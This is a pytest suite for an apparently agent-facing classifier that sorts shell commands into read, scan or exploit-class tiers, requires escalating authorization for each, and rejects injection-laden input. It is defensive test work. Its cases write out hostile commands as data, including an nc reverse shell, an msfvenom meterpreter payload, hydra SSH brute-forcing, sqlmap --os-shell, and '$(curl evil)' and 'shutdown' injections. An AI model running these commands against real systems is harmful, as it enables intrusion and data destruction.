"""KA-053 tests - blast-radius classifier: read/scan/exploit-class
tagging with pinned evidence rules, the authorization requirement
mapping (levels, level names, lab staging), fail-closed unknown
programs, escalation keywords that only ever raise the class (curl
write-indicator scoping checked against nmap -d/-T, wget -T, and curl
--fail), the full hostile-input rejection table with pinned messages
(parametrized), the exact audit-event dict with JSON round-trip,
determinism/echo behavior, and the planner purity source-scan (no
execution, no network, no wall clock, no package imports). No network."""
from __future__ import annotations

import dataclasses
import importlib
import json
import re
from pathlib import Path

import pytest

from agentic_ai.agents.cyber.blast_radius import (
    BLAST_CLASSES,
    CLASS_EXPLOIT,
    CLASS_READ,
    CLASS_SCAN,
    CommandClassification,
    ESCALATION_SUBSTRINGS,
    ESCALATION_TOKENS,
    EVENT_KIND,
    EXPLOIT_PROGRAMS,
    FORBIDDEN_METACHARS,
    MAX_COMMAND_CHARS,
    PROGRAM_CLASSES,
    READ_PROGRAMS,
    REQUIRED_LEVEL_NAMES,
    REQUIRED_LEVELS,
    SCAN_PROGRAMS,
    STAGING_CLASSES,
    TOOL_ESCALATION_SUBSTRINGS,
    TOOL_ESCALATION_TOKENS,
    audit_event,
    classify,
)

# Named pin constants - the drift alarm for the curated program catalog.
# Updated in the SAME task that changes the catalog.
READ_PROGRAM_COUNT = 47
SCAN_PROGRAM_COUNT = 34
EXPLOIT_PROGRAM_COUNT = 28


def test_constant_surface():
    assert BLAST_CLASSES == ("read", "scan", "exploit-class")
    assert CLASS_READ == "read" and CLASS_SCAN == "scan"
    assert CLASS_EXPLOIT == "exploit-class"
    assert REQUIRED_LEVELS == {"read": 1, "scan": 2, "exploit-class": 3}
    assert REQUIRED_LEVEL_NAMES == {1: "basic", 2: "advanced", 3: "critical"}
    assert STAGING_CLASSES == frozenset({"exploit-class"})
    assert EVENT_KIND == "command_blast_radius_classified"
    assert MAX_COMMAND_CHARS == 256
    assert FORBIDDEN_METACHARS == (";", "|", "&", "<", ">", "`", "$", "\\")


def test_program_catalog_pins():
    assert len(READ_PROGRAMS) == READ_PROGRAM_COUNT
    assert len(SCAN_PROGRAMS) == SCAN_PROGRAM_COUNT
    assert len(EXPLOIT_PROGRAMS) == EXPLOIT_PROGRAM_COUNT
    for programs in (READ_PROGRAMS, SCAN_PROGRAMS, EXPLOIT_PROGRAMS):
        assert tuple(sorted(programs)) == programs  # sorted, deterministic
        assert len(set(programs)) == len(programs)  # deduped
        for name in programs:
            assert re.fullmatch(r"[a-z0-9._-]+", name), name
    catalog = PROGRAM_CLASSES
    assert len(catalog) == (READ_PROGRAM_COUNT + SCAN_PROGRAM_COUNT
                            + EXPLOIT_PROGRAM_COUNT)  # disjoint groups
    assert set(catalog.values()) == {"read", "scan", "exploit-class"}
    assert catalog["cat"] == CLASS_READ
    assert catalog["curl"] == CLASS_READ
    assert catalog["searchsploit"] == CLASS_READ
    assert catalog["nmap"] == CLASS_SCAN
    assert catalog["testssl.sh"] == CLASS_SCAN
    assert catalog["hydra"] == CLASS_EXPLOIT
    assert catalog["msfconsole"] == CLASS_EXPLOIT


@pytest.mark.parametrize("command,program,rule", [
    ("cat /etc/passwd", "cat", "program:cat"),
    ("grep root /var/log/auth.log", "grep", "program:grep"),
    ("dig example.com", "dig", "program:dig"),
    ("ldapsearch -h dc1 dc=x", "ldapsearch", "program:ldapsearch"),
    ("searchsploit linux kernel", "searchsploit", "program:searchsploit"),
    ("curl http://h/", "curl", "program:curl"),
    ("curl -f http://h/", "curl", "program:curl"),  # --fail never escalates
    ("wget -T 10 http://h/", "wget", "program:wget"),  # wget -T is timeout
])
def test_read_commands(command, program, rule):
    result = classify(command)
    assert type(result) is CommandClassification  # exact shape, not a mock
    assert result.blast_class == CLASS_READ
    assert result.program == program
    assert result.rule == rule
    assert result.required_level == 1
    assert result.level_name == "basic"
    assert result.staging_required is False


@pytest.mark.parametrize("command,program,rule", [
    ("nmap -sV 10.0.0.5", "nmap", "program:nmap"),
    ("NMAP -sV h", "nmap", "program:nmap"),  # case-insensitive catalog
    ("/usr/bin/nmap -sV h", "nmap", "program:nmap"),  # dir part dropped
    ('"nmap" -p 80 h', "nmap", "program:nmap"),  # quotes stripped
    ("ping -c1 10.0.0.5", "ping", "program:ping"),
    ("gobuster dir -u http://t -w w", "gobuster", "program:gobuster"),
    ("nmap --data-length 10 target", "nmap", "program:nmap"),  # no --data hit
    ("testssl.sh http://h/", "testssl.sh", "program:testssl.sh"),
])
def test_scan_commands(command, program, rule):
    result = classify(command)
    assert result.blast_class == CLASS_SCAN
    assert result.program == program
    assert result.rule == rule
    assert result.required_level == 2
    assert result.level_name == "advanced"
    assert result.staging_required is False


@pytest.mark.parametrize("command,program,rule", [
    ("hydra -l root -P w.txt ssh://10.0.0.5", "hydra", "program:hydra"),
    ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4",
     "msfvenom", "program:msfvenom"),
    ("sqlmap -u http://t --batch", "sqlmap", "program:sqlmap"),
    ("bettercap -iface eth0", "bettercap", "program:bettercap"),
    ("crackmapexec smb 10.0.0.0/24", "crackmapexec", "program:crackmapexec"),
])
def test_exploit_commands(command, program, rule):
    result = classify(command)
    assert result.blast_class == CLASS_EXPLOIT
    assert result.program == program
    assert result.rule == rule
    assert result.required_level == 3
    assert result.level_name == "critical"
    assert result.staging_required is True


@pytest.mark.parametrize("command,program", [
    ("python3 -c 'print(1)'", "python3"),  # interpreters fail closed
    ("sudo nmap -sV h", "sudo"),  # privilege runners fail closed
    ("doas cat /etc/passwd", "doas"),
    ("bash -c id", "bash"),  # shells fail closed
    ("nc -e /bin/sh 10.0.0.5 4444", "nc"),
    ("/usr/bin/pwsh -c x", "pwsh"),
    ("nixcraft", "nixcraft"),  # anything unknown fails closed
])
def test_unknown_program_fails_closed(command, program):
    result = classify(command)
    assert result.blast_class == CLASS_EXPLOIT
    assert result.program == program
    assert result.rule == "unknown:%s" % (program,)
    assert result.required_level == 3
    assert result.level_name == "critical"
    assert result.staging_required is True


@pytest.mark.parametrize("command,rule", [
    ("grep exploit /var/log/x", "keyword:exploit"),  # over-tag is by design
    ("msfconsole -q -x 'use exploit/multi/handler'", "keyword:exploit"),
    ("msfconsole -q use/payload/x", "keyword:payload"),
    ("curl http://h/payload.bin", "keyword:payload"),
    ("sqlmap -u http://t --os-shell=sh", "keyword:--os-shell"),
    ("curl -X POST http://h/", "keyword:post"),
    ("curl -X PATCH http://h/", "keyword:patch"),
    ("curl -X PUT --data x h", "keyword:put"),
    ("wget --post-data=x http://h/", "keyword:--post"),
    ("curl --data 'a=1' http://h/", "tool:curl:--data"),
    ("curl -F f=1 http://h/", "tool:curl:-F"),
    ("curl -T f http://h/", "tool:curl:-T"),
    ("curl -d a=1 http://h/", "tool:curl:-d"),
    ("curl --data-binary @f http://h/", "tool:curl:--data"),
])
def test_escalations_yield_exploit_class(command, rule):
    result = classify(command)
    assert result.blast_class == CLASS_EXPLOIT
    assert result.rule == rule
    assert result.required_level == 3
    assert result.level_name == "critical"
    assert result.staging_required is True


def test_evidence_priority_is_pinned():
    # token matches beat substring matches: -X PUT, not the --data body
    assert classify("curl -X PUT --data x h").rule == "keyword:put"
    # keyword evidence beats the program catalog even when both map
    # exploit-class; the rule documents what fired first
    assert classify("msfconsole -q use/payload/x").rule == "keyword:payload"
    # escalation only ever raises: a scan command without keywords stays scan
    assert classify("nmap -p80 host").blast_class == CLASS_SCAN


@pytest.mark.parametrize("evil,message", [
    ("", "command is empty"),
    ("   ", "command is empty"),
    ("\t", "command contains control characters"),
    ("x\t", "command contains control characters"),
    ("\x01 cmd", "command contains control characters"),
    ("\x7f", "command contains control characters"),
    ("cmd\n", "command contains control characters"),
    ("example.com\nnewlines", "command contains control characters"),
    ("é x", "command contains non-ASCII characters"),
    ("a;b", "command contains shell metacharacters"),
    ("a | b", "command contains shell metacharacters"),
    ("a&&b", "command contains shell metacharacters"),
    ("a||b", "command contains shell metacharacters"),
    ("a<b", "command contains shell metacharacters"),
    ("a>b", "command contains shell metacharacters"),
    ("a&b", "command contains shell metacharacters"),
    ("`id`", "command contains shell metacharacters"),
    ("$(id)", "command contains shell metacharacters"),
    ("$HOME echo", "command contains shell metacharacters"),
    ("echo a\\b", "command contains shell metacharacters"),
    ("example.com; shutdown -h now", "command contains shell metacharacters"),
    ("example.com $(curl evil)", "command contains shell metacharacters"),
    ("10.0.0.5 && whoami", "command contains shell metacharacters"),
    ("x" * 257, "command exceeds 256 printable characters"),
    ('""', "command has no program token"),
    (None, "command must be a string, got NoneType"),
    (42, "command must be a string, got int"),
    (True, "command must be a string, got bool"),
])
def test_hostile_inputs_rejected(evil, message):
    with pytest.raises(ValueError) as excinfo:
        classify(evil)
    assert str(excinfo.value) == message


def test_audit_event_exact_shape():
    scan = classify("nmap -sV 10.0.0.5")
    assert audit_event(scan) == {
        "event": "command_blast_radius_classified",
        "command": "nmap -sV 10.0.0.5",
        "program": "nmap",
        "blast_class": "scan",
        "rule": "program:nmap",
        "required_level": 2,
        "level_name": "advanced",
        "staging_required": False,
    }
    exploit = audit_event(classify("hydra -l x ssh://h"))
    assert exploit["staging_required"] is True
    assert exploit["blast_class"] == "exploit-class"
    assert exploit["required_level"] == 3
    assert exploit["level_name"] == "critical"
    for event in (audit_event(scan), exploit):
        assert json.loads(json.dumps(event)) == event  # JSON-serializable
        assert isinstance(event["staging_required"], bool)


def test_determinism_and_echo():
    r1 = classify("  cat /etc/passwd  ")
    r2 = classify("  cat /etc/passwd  ")
    assert r1 == r2  # frozen dataclass equality, deterministic
    assert audit_event(r1) == audit_event(r2)
    assert r1.command == "cat /etc/passwd"  # echo is the stripped form
    # same-class commands match on everything but the echoed command text
    upper = classify("NMAP -sV h")
    lower = classify("nmap -sV h")
    assert (upper.blast_class, upper.program, upper.rule) == (
        lower.blast_class, lower.program, lower.rule)


def test_classification_is_frozen():
    result = classify("cat /etc/passwd")
    with pytest.raises(dataclasses.FrozenInstanceError):
        result.blast_class = CLASS_SCAN


def test_authorization_mapping_alignment():
    # weakest -> strongest classes carry strictly increasing levels
    assert [REQUIRED_LEVELS[c] for c in BLAST_CLASSES] == [1, 2, 3]
    assert REQUIRED_LEVEL_NAMES == {1: "basic", 2: "advanced", 3: "critical"}
    assert STAGING_CLASSES == frozenset({CLASS_EXPLOIT})
    # every class maps; no extra and no missing keys
    assert set(REQUIRED_LEVELS) == set(BLAST_CLASSES)


def test_escalation_machinery_pins():
    assert ESCALATION_TOKENS == ("post", "put", "patch", "delete", "mkfifo")
    assert ESCALATION_SUBSTRINGS == (
        "exploit", "payload", "--form", "--os-shell", "--file-write",
        "--post", "--upload-file")
    assert TOOL_ESCALATION_TOKENS == {"curl": ("-d", "-F", "-T")}
    assert TOOL_ESCALATION_SUBSTRINGS == {"curl": ("--data",)}


def test_module_purity_source_scan():
    # planner purity by construction: the module never imports the package,
    # reads no wall clock, and uses no exec or network facilities
    module = importlib.import_module("agentic_ai.agents.cyber.blast_radius")
    source = Path(module.__file__).read_text(encoding="utf-8")
    assert "from agentic_ai" not in source
    assert "import agentic_ai" not in source
    assert "utcnow" not in source
    assert "time.time" not in source
    for banned in ("subprocess", "os.system", "eval(", "open(",
                   "urllib", "socket", "requests"):
        assert banned not in source, banned